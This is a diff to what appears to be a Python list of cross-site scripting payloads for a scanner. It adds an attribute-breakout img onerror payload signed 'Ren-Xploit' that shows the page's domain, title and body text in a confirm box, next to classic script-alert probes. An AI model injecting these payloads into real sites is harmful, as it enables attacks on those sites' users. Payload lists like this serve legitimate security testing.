@@ -1,4 +1,6 @@
 payloads = [
+
+    '"><img src=x onerror="confirm(`------XSS By Ren-Xploit------\nSystem::\n- Domain: ${document.domain}\n- ReadyState: ${document.readyState}\n- InputEncoding: ${document.inputEncoding}\n- Title: ${document.title}\n- TextContent: ${document.body.textContent}\n- Protocol: ${location.protocol}\n- LastModified: ${document.lastModified}`)">',
     "<script>alert('XSS')</script>",
     "'\"><script>alert('XSS')</script>",
     "<img src=x onerror=alert('XSS')>",
